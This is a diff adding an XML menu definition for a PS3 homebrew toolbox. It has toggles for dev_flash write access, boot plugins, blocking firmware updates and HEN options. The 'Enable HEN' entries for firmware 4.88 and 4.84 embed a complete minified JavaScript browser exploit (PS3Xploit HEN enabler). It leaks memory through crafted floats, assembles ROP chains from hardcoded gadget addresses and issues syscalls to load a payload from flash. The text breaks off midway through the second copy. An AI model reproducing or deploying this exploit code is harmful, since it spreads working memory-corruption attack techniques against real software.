@@ -1,0 +1,2113 @@
+<XMBML version="1.0">
+
+	<View id="firmware_settings_items">
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="firmware_setting_main" src="#firmware_setting_main_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="ps2_module" src="#ps2_main_items"/>
+		</Items>
+	</View>
+
+	<View id="firmware_setting_main_items">
+		<Attributes>
+			<Table key="toggle_dev_blind">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_flash.png</></Pair>
+				<Pair key="title"><>Toggle dev_blind</></Pair>
+				<Pair key="info"><>Enable/Disable dev_flash write access</></Pair>
+			</Table>
+			<Table key="toggle_bootplugins">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_plugin.png</></Pair>
+				<Pair key="title"><>Toggle All Plugins</></Pair>
+				<Pair key="info"><>Enable/Disable boot_plugins.txt</></Pair>
+			</Table>
+			<Table key="toggle_power_options">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_power.png</></Pair>
+				<Pair key="title"><>Toggle Power Options</></Pair>
+				<Pair key="info"><>Add power cycling to the user category</></Pair>
+			</Table>
+			<Table key="toggle_package_manager">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_package.png</></Pair>
+				<Pair key="title"><>Package Manager Options</></Pair>
+				<Pair key="info"><>Add/Remove/Upgrade Package Manager on flash</></Pair>
+			</Table>
+			<Table key="toggle_app_home">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_folder.png</></Pair>
+				<Pair key="title"><>App Home Options</></Pair>
+				<Pair key="info"><>Add/Remove/Move the App_Home XMB item</></Pair>
+			</Table>
+			<Table key="toggle_xil">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_hknw.png</></Pair>
+				<Pair key="title"><>Toggle Xil Apps</></Pair>
+				<Pair key="info"><>Add/Remove OFW XMB apps/links</></Pair>
+			</Table>
+			<Table key="toggle_updates">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_refresh.png</></Pair>
+				<Pair key="title"><>Block Firmware Updates</></Pair>
+				<Pair key="info"><>Stop system updates from the XMB</></Pair>
+			</Table>
+			<Table key="toggle_game_sorting">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_game_folder.png</></Pair>
+				<Pair key="title"><>Game Sorting Options</></Pair>
+				<Pair key="info"><>Sort games by name and/or time</></Pair>
+			</Table>
+			<Table key="toggle_ext_download_plugin">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_download.png</></Pair>
+				<Pair key="title"><>Toggle Ext. Download Plugin</></Pair>
+				<Pair key="info"><>Install a custom download plugin to flash</></Pair>
+			</Table>
+			<Table key="toggle_headset_audio">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_headset_game_sound.png</></Pair>
+				<Pair key="title"><>Toggle Audio to Headset</></Pair>
+				<Pair key="info"><>Modifed libaudio.sprx to pass all audio to headset</></Pair>
+			</Table>
+			<Table key="toggle_ip">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_web.png</></Pair>
+				<Pair key="title"><>Show IP on XMB</></Pair>
+				<Pair key="info"><>Options to Show IP address on XMB</></Pair>
+			</Table>
+			<Table key="toggle_long_coldboot_audio">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_audio.png</></Pair>
+				<Pair key="title"><>Allow Ext. Coldboot Audio</></Pair>
+				<Pair key="info"><>Enable startup sounds up to 20 seconds long</></Pair>
+			</Table>
+			<Table key="hen_options">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_hen.png</></Pair>
+				<Pair key="title"><>HEN Options</></Pair>
+				<Pair key="info"><>Advanced users - HEN Only</></Pair>
+			</Table>
+			<Table key="toggle_cobra_options">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_cobra.png</></Pair>
+				<Pair key="title"><>Cobra Options</></Pair>
+				<Pair key="info"><>Advanced users - CFW Only</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_dev_blind" attr="toggle_dev_blind" src="#toggle_dev_blind_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_bootplugins" attr="toggle_bootplugins" src="#toggle_bootplugins_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_power_options" attr="toggle_power_options" src="#toggle_power_options_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_package_manager" attr="toggle_package_manager" src="#toggle_package_manager_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_app_home" attr="toggle_app_home" src="#toggle_app_home_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_xil" attr="toggle_xil" src="#toggle_xil_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_updates" attr="toggle_updates" src="#toggle_updates_items"/>
+	<!--	<Query class="type:x-xmb/folder-pixmap" key="toggle_game_sorting" attr="toggle_game_sorting" src="#toggle_game_sorting_items"/> REMOVED - TOO MANY PROBLEMS -->
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_ext_download_plugin" attr="toggle_ext_download_plugin" src="#toggle_ext_download_plugin_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_headset_audio" attr="toggle_headset_audio" src="#toggle_headset_audio_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_long_coldboot_audio" attr="toggle_long_coldboot_audio" src="#toggle_long_coldboot_audio_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_ip"	attr="toggle_ip" src="#toggle_ip_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="hen_options" attr="hen_options" src="#hen_option_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_cobra_options" attr="toggle_cobra_options" src="#cobra_settings_items"/>
+		</Items>
+	</View>
+	
+	<View id="hen_option_items">
+		<Attributes>
+			<Table key="hen_484">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>HEN 4.84 Options</></Pair>
+				<Pair key="info"><>Toggle features specific to HFW 4.84 and HEN</></Pair>
+			</Table>
+			<Table key="hen_485">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>HEN 4.85 Options</></Pair>
+				<Pair key="info"><>Toggle features specific to HFW 4.85 and HEN</></Pair>
+			</Table>
+			<Table key="hen_486">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>HEN 4.86 Options</></Pair>
+				<Pair key="info"><>Toggle features specific to HFW 4.86 and HEN</></Pair>
+			</Table>
+			<Table key="hen_487">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>HEN 4.87 Options</></Pair>
+				<Pair key="info"><>Toggle features specific to HFW 4.87 and HEN</></Pair>
+			</Table>
+			<Table key="hen_488">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>HEN 4.88 Options</></Pair>
+				<Pair key="info"><>Toggle features specific to HFW 4.88 and HEN</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="hen_488" attr="hen_488" src="#hen_488_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="hen_487" attr="hen_487" src="#hen_487_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="hen_486" attr="hen_486" src="#hen_486_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="hen_485" attr="hen_485" src="#hen_485_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="hen_484" attr="hen_484" src="#hen_484_items"/>
+		</Items>
+	</View>
+	
+	<View id="hen_488_items">
+		<Attributes>
+			<Table key="hen_488_enabler">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/arrow.png</></Pair>
+				<Pair key="title"><>Enable HEN</></Pair>
+				<Pair key="info"><>4.88 HFW Only   </></Pair>
+				<Pair key="module_name"><>webrender_plugin</></Pair>
+				<Pair key="module_action"><>javascript:window.resizeTo(1920,1080);eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,mbytes=1048576,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,stat_size_offset=40,toc_addr=7296336,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352696,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod7_addr=108204,gmod8_addr=2862264,gmod4b_addr=4376440,gmod4c_addr=346864,gmod15_addr=3788856,gmod12_addr=6500700,gmod9_addr=68384,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),fail_msg_frag="HEN Exploit initialization failed!",fsopen=801,fsread=802,fswrite=803,fsclose=804,fsstat=808;"4.88"===fwv&&(toc_addr=7296344,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352856,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod4b_addr=4376440,gmod4c_addr=346864,gmod7_addr=108204,gmod8_addr=2862264,gmod9_addr=68384,gmod12_addr=6500860,gmod15_addr=3788856);function show(a){document.getElementById("result").innerHTML=a}function scall_r3r5_p2p(a,b,c,d,e,f,g,k,l,h){null===h&&(h=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(a)+hw(l)+hw(g)+hw(f)+hw(e)+fill4(4,dbyte41)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(16,dbyte41)+hdw(d-4)+hdw(gtemp_addr)+fill8(24,dbyte41)+hdw(gmod4c_addr)+fill16(176,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod4b_addr)+fill16(96,dbyte41)+hdw(h)+hdw(sp_exit)+fill8(8,dbyte41)}function load_r3_word_from_ptr_32(a,b,c,d,e,f,g){return hdw(gmod3_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+hdw(a-8)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod15_addr)+fill16(80,dbyte41)+fill8(8,dbyte41)+hdw(b)+hdw(c)+hdw(d)+hdw(e)+hdw(f)+hdw(g)+hdw(sp_exit)+fill8(8,dbyte41)}function h2b(a){return String.fromCharCode(a)}function hw(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function hdw(a){return hw(0)+hw(a)}String.prototype.toHex16=function(){return("0000"+this).substr(-4)};String.prototype.toAscii=function(a){for(var b="",c=0;c\74this.length;)b=!0===a?b+this.charCodeAt(c).toString(16).toHex16():b+this.charCodeAt(c).toString(16),c+=1;return b};String.prototype.convert=function(a){if(1\76this.length)return"";var b=0,c=[];for(a=!0===a?this:this.toAscii();0!==a.length%4;)a+="00";for("00"!==a.substr(a.length-3,2)&&(a+="0000");b\74a.length;){var d=a.substr(b,4);c.push(String.fromCharCode(parseInt(d,16)));b+=4}return c.join("")};String.prototype.convertedSize=function(a){if(1\76this.length)return 0;for(a=!0===a?this:this.toAscii();0!==a.length%4;)a+="00";"00"!==a.substr(a.length-3,2)&&(a+="0000");return a.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(1===a.length)return a[0];var b="",c=0\76this?"-":"",d=a[0].replace(".","");a=Number(a[1])+1;if(0\76a){for(b=c+"0.";a++;)b+="0";return b+d.replace(/^-/,"")}for(a-=d.length;a--;)b+="0";return d+b};function fromIEEE754(a,b,c){var d=[],e,f;for(e=a.length;e;--e){var g=a[e-1];for(f=8;f;--f)d.push(g%2?1:0),g\76\76=1}d.reverse();f=d.join("");a=(1\74\74b-1)-1;d=parseInt(f.substring(0,1),2)?-1:1;e=parseInt(f.substring(1,1+b),2);f=parseInt(f.substring(1+b),2);return(e===(1\74\74b)-1?0!==f?NaN:Infinity*d:0\74e?d*Math.pow(2,e-a)*(1+f/Math.pow(2,c)):0!==f?f/Math.pow(2,c)*Math.pow(2,-(a-1))*d:0*d).noExponents()}function generateIEEE754(a,b){return fromIEEE754([a\76\7624&255,a\76\7616&255,a\76\768&255,a&255,b\76\7624&255,b\76\7616&255,b\76\768&255,b&255],11,52)}function generateExploit(a,b){return generateIEEE754(a,(a\74\7432|(b\76\761)-1)-a)}function rmem(a,b){document.getElementById("exploit")&&(document.getElementById("exploit").style.src="local("+generateExploit(a,b)+")")}function cmem(a,b,c){if(document.getElementById("exploit"))return rmem(a,b),document.getElementById("exploit").style.src.substr(6,c)}function trigger(a){document.getElementById("trigger")&&(document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")"))}function lc1(){total_loops\74max_loops?t_out=setTimeout(initROP,500,!1):(total_loops=0,show(fail_msg_frag),t_out=0)}function lc2(){total_loops\74max_loops?t_out=setTimeout(initROP2,500,!1):(total_loops=0,show(fail_msg_frag),2,t_out=0)}function findJsVariableOffset(a,b,c,d){rmem(c,d);a=document.getElementById("exploit").style.src.substr(6,d);d=0;for(var e,f;d\742*a.length;){if(a.charCodeAt(d/2)===b.charCodeAt(0)){for(e=f=0;e\742*b.length&&a.charCodeAt((d+e)/2)===b.charCodeAt(e/2);e+=2)f+=1;if(f===b.length){c=c+d+4;for(b=0;b\74offset_array.length;b+=1)if(offset_array[b]===c)return-1;offset_array.push(c);return c}}d+=16}return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,112)}function stack_frame_hookup(){return unescape("\u4141\u2a2f")+hw(gadget1_addr)+hw(toc_addr)+fill16(32,dbyte41)+hdw(toc_addr)+fill16(112,dbyte41)}function scall(a,b,c,d,e,f,g,k,l,h){null===h&&(h=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(a)+hw(l)+hw(g)+hw(f)+hw(e)+hw(d)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(32,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod4a_addr)+fill16(96,dbyte41)+hdw(h)+hdw(sp_exit)+fill8(8,dbyte41)}function callsub(a,b,c,d,e,f,g,k,l,h,p,m,n){null===n&&(n=gtemp_addr);null===m&&(m=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(h)+hw(l)+hw(g)+hw(f)+hw(e)+hw(d)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(32,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(m)+fill16(16,dbyte41)+hdw(a)+fill16(p-32,dbyte00)+hdw(n)+hdw(sp_exit)+fill8(8,dbyte41)}function fillNbytes(a,b,c){var d="",e=0;for(b=h2b(b);e\74a/c;)d+=b.repeat(c/2),e++;return d}function fill4(a,b){return fillNbytes(a,b,4)}function fill8(a,b){return fillNbytes(a,b,8)}function fill16(a,b){return fillNbytes(a,b,16)}function strncmp(a,b,c){a=a.substring(0,c);b=b.substring(0,c);return a==b?0:a\76b?1:-1}function rop_exit_hen(a){a=cmem(2315255808,16,3);a=a.toAscii(!0);0!=strncmp("53434500",a,4)?(show("Failed! Rebooting!"),initROP2(!0)):window.close()}function initROP2(a){try{!0===a&&(total_loops=search_size_ext=search_base_off=frame_fails=0);0!==t_out&&(clearTimeout(t_out),t_out=0);offset_array=[];jump_1_addr=jump_2_addr=stack_frame_addr=0;search_max_threshold=73400320;search_base=2148532224;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;for(stack_frame=stack_frame_hookup()+stack_frame_swap(2315649024);0===stack_frame_addr;){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;0===frame_fails%10&&(search_base_off+=0,search_size_ext+=0);lc2();return}stack_frame=stack_frame.replaceAt(0,h2b(10799));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(-1==stack_frame_addr&&search_max_threshold\74search_size+search_size_ext){frame_fails++;lc2();return}search_max_threshold-=search_size+search_size_ext}for(jump_2=unescape("\u0102\u7efb")+fill16(48,33410)+hw(stack_frame_addr)+unescape("\ufb7e");0===jump_2_addr;){if(search_max_threshold\74search_size){lc2();return}jump_2=jump_2.replaceAt(0,h2b(32507));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(-1==jump_2_addr&&search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}for(jump_1=unescape("\u4141\u7efa")+hw(jump_2_addr)+unescape("\ufa7e");0===jump_1_addr;){if(search_max_threshold\74search_size){lc2();return}jump_1=jump_1.replaceAt(0,h2b(32506));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(-1==jump_1_addr&&search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}var b=cmem(stack_frame_addr-4,32768,stack_frame.length),c=cmem(jump_2_addr-4,4096,jump_2.length),d=cmem(jump_1_addr-4,4096,jump_1.length);c===jump_2&&d===jump_1&&b===stack_frame?(0!==t_out&&clearTimeout(t_out),setTimeout(trigger,1E3,jump_1_addr)):lc2()}catch(e){show("HEN installation failed because the following exception was thrown during execution: "+e+" at: "+e.lineNumber)}}function initROP(a){try{!0===a&&(search_size_ext=search_base_off=frame_fails=0);0!==t_out&&(clearTimeout(t_out),t_out=0);offset_array=[];jump_1_addr=jump_2_addr=stack_frame_addr=xtra_data_addr=0;search_max_threshold=73400320;search_base=2148532224;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;for(xtra_data=start_x.convert()+"/dev_flash/hen/PS3HEN.BIN".convert()+index_key.convert(!0)+unescape("\ufd7e");0===xtra_data_addr;){if(search_max_threshold\74search_size){lc1();return}xtra_data=xtra_data.replaceAt(0,h2b(32509));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}var b=xtra_data_addr+start_x.convertedSize()-4;index_key_addr=b+"/dev_flash/hen/PS3HEN.BIN".convertedSize();for(stack_frame=stack_frame_hookup()+scall(801,b,0,2382364672,0,0,0,0,0)+scall_r3r5_p2p(802,2382364672,2315255808,3145728,2382364680,0,0,0,0,0,0)+stack_frame_swap(2315255808);0===stack_frame_addr;){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;0===frame_fails%10&&(search_base_off+=0,search_size_ext+=0);lc1();return}stack_frame=stack_frame.replaceAt(0,h2b(10799));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(-1==stack_frame_addr&&search_max_threshold\74search_size+search_size_ext){frame_fails++;lc1();return}search_max_threshold-=search_size+search_size_ext}for(jump_2=unescape("\u0102\u7efb")+fill16(48,33410)+hw(stack_frame_addr)+unescape("\ufb7e");0===jump_2_addr;){if(search_max_threshold\74search_size){lc1();return}jump_2=jump_2.replaceAt(0,h2b(32507));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(-1==jump_2_addr&&search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}for(jump_1=unescape("\u4141\u7efa")+hw(jump_2_addr)+unescape("\ufa7e");0===jump_1_addr;){if(search_max_threshold\74search_size){lc1();return}jump_1=jump_1.replaceAt(0,h2b(32506));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(-1==jump_1_addr&&search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}var c=cmem(stack_frame_addr-4,32768,stack_frame.length),d=cmem(xtra_data_addr-4,4096,xtra_data.length),e=cmem(jump_2_addr-4,4096,jump_2.length),f=cmem(jump_1_addr-4,4096,jump_1.length);e===jump_2&&f===jump_1&&d===xtra_data&&c===stack_frame?(0!==t_out&&clearTimeout(t_out),triggerX()):lc1()}catch(g){show("HEN installation failed because the following exception was thrown during execution: "+g+" at: "+g.lineNumber)}}function stack_frame_swap(a){return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+hdw(a)+fill8(8,dbyte41)+hdw(gmod9_addr)}function triggerX(){setTimeout(trigger,1E3,jump_1_addr);setTimeout(rop_exit_hen,4500,"HEN Failed!");total_loops=t_out=0}document.write(\47\74html\76\74head\76\74title\76PS3Xploit - HEN Enabler\74/title\76\74style\76html{left:100%;overflow:hidden;position:relative}input{opacity:0;position:relative;left:-100%}#a{display:table;height:100%;left:-100%;position:relative;width:100%;text-align:center}#b{display:table-cell;vertical-align:middle;width:100%}#result{font-size:20px;font-weight:bold;color:#fff;padding-top:16px}#dot{-webkit-border-radius:180px;background-color:rgba(255,255,255,0.4);width:160px;height:160px;position:relative;display:inline-block}#dot::before,#dot::after{-webkit-border-radius:180px;content:"";width:188px;height:188px;position:absolute;left:-20px;top:-20px;z-index:-1;border:6px solid rgba(255,255,255,0.4);background-color:transparent}#dot::after{width:176px;height:176px;left:-11px;top:-11px;border:3px solid rgba(255,255,255,0.4)}#c{margin-top:62px;left:16px;position:relative}#c div{-webkit-border-radius:8px;position:absolute;background:#fff}#c div:nth-child(1), #c div:nth-child(3), #c div:nth-child(6), #c div:nth-child(8){width:10px;height:40px}#c div:nth-child(2){height:10px;width:24px;left:12px;top:15px}#c div:nth-child(3){left:32px}#c div:nth-child(4){-webkit-border-radius:40px;width:26px;height:26px;left:48px;border:8px solid #fff;background-color:transparent;border-right-color:transparent}#c div:nth-child(5), #c div:nth-child(7){left:100px;top:8px;background-color:transparent;font-size:26px;font-weight:bolder;text-shadow:0px 4px #fff;color:#fff;letter-spacing:-24px}#c div:nth-child(5){left:60px;top:4px;font-size:20px;text-shadow:3px 0px #fff}#c div:nth-child(6){left:88px}#c div:nth-child(8){left:120px}\74/style\76\74/head\76\74body\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76 \74input type="radio" autofocus /\76\74div id="a"\76\74div id="b"\76\74div id="dot"\76\74div id="c"\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\u2571\74/div\76\74div\76\74/div\76\74div\76\u2572\u2572\74/div\76\74div\76\74/div\76\74/div\76\74/div\76\74div id="result"\76\74/div\76\74/div\76\74/div\76\74/body\76\74/html\76\47);setTimeout(function(){initROP(!0)},0);')</></Pair>
+			</Table>
+			<Table key="hen_488_enabler_installer">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Promote HEN Enabler</></Pair>
+				<Pair key="info"><>Install a 4.88 HEN Enabler to the root of the game category</></Pair>
+			</Table>
+			<Table key="hen_488_reinstall">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/package_setup.png</></Pair>
+				<Pair key="title"><>Reinstall HEN</></Pair>
+				<Pair key="info"><>Download and install HEN for 4.88 HFW
+				Note: HEN must be enabled above first</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="hen_488_enabler" attr="hen_488_enabler"/>
+			<Query class="type:x-xmb/folder-pixmap" key="hen_488_enabler_installer" attr="hen_488_enabler_installer" src="#hen_488_enabler_installer_item"/>
+	<!--	<Query class="type:x-xmb/folder-pixmap" key="hen_488_reinstall" attr="hen_488_reinstall" src="#hen_488_reinstall_item"/> -->
+		</Items>
+	</View>
+	
+	<View id="hen_488_enabler_installer_item">
+		<Attributes>
+			<Table key="hen_488_enabler_promoter_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Current HEN Enabler will be overwritten, are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back.
+				
+				This will copy a hen_enabler.xml for 4.88 to dev_flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/hen_enablers/488#/dev_blind/vsh/resource/explore</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/module-action" key="hen_488_enabler_promoter_action" attr="hen_488_enabler_promoter_action" />
+		</Items>
+	</View>
+	
+	<View id="hen_484_items">
+		<Attributes>
+			<Table key="hen_484_enabler">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/arrow.png</></Pair>
+				<Pair key="title"><>Enable HEN</></Pair>
+				<Pair key="info"><>4.84 HFW Only   </></Pair>
+				<Pair key="module_name"><>webrender_plugin</></Pair>
+				<Pair key="module_action"><>javascript:window.resizeTo(1920,1080);eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,mbytes=1048576,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,stat_size_offset=40,toc_addr=7296336,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352696,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod7_addr=108204,gmod8_addr=2862264,gmod4b_addr=4376440,gmod4c_addr=346864,gmod15_addr=3788856,gmod12_addr=6500700,gmod9_addr=68384,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),fail_msg_frag="HEN Exploit initialization failed!",fsopen=801,fsread=802,fswrite=803,fsclose=804,fsstat=808;"4.84"===fwv&&(toc_addr=7296344,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352856,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod4b_addr=4376440,gmod4c_addr=346864,gmod7_addr=108204,gmod8_addr=2862264,gmod9_addr=68384,gmod12_addr=6500860,gmod15_addr=3788856);function show(a){document.getElementById("result").innerHTML=a}function scall_r3r5_p2p(a,b,c,d,e,f,g,k,l,h){null===h&&(h=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(a)+hw(l)+hw(g)+hw(f)+hw(e)+fill4(4,dbyte41)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(16,dbyte41)+hdw(d-4)+hdw(gtemp_addr)+fill8(24,dbyte41)+hdw(gmod4c_addr)+fill16(176,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod4b_addr)+fill16(96,dbyte41)+hdw(h)+hdw(sp_exit)+fill8(8,dbyte41)}function load_r3_word_from_ptr_32(a,b,c,d,e,f,g){return hdw(gmod3_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+hdw(a-8)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod15_addr)+fill16(80,dbyte41)+fill8(8,dbyte41)+hdw(b)+hdw(c)+hdw(d)+hdw(e)+hdw(f)+hdw(g)+hdw(sp_exit)+fill8(8,dbyte41)}function h2b(a){return String.fromCharCode(a)}function hw(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function hdw(a){return hw(0)+hw(a)}String.prototype.toHex16=function(){return("0000"+this).substr(-4)};String.prototype.toAscii=function(a){for(var b="",c=0;c\74this.length;)b=!0===a?b+this.charCodeAt(c).toString(16).toHex16():b+this.charCodeAt(c).toString(16),c+=1;return b};String.prototype.convert=function(a){if(1\76this.length)return"";var b=0,c=[];for(a=!0===a?this:this.toAscii();0!==a.length%4;)a+="00";for("00"!==a.substr(a.length-3,2)&&(a+="0000");b\74a.length;){var d=a.substr(b,4);c.push(String.fromCharCode(parseInt(d,16)));b+=4}return c.join("")};String.prototype.convertedSize=function(a){if(1\76this.length)return 0;for(a=!0===a?this:this.toAscii();0!==a.length%4;)a+="00";"00"!==a.substr(a.length-3,2)&&(a+="0000");return a.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return 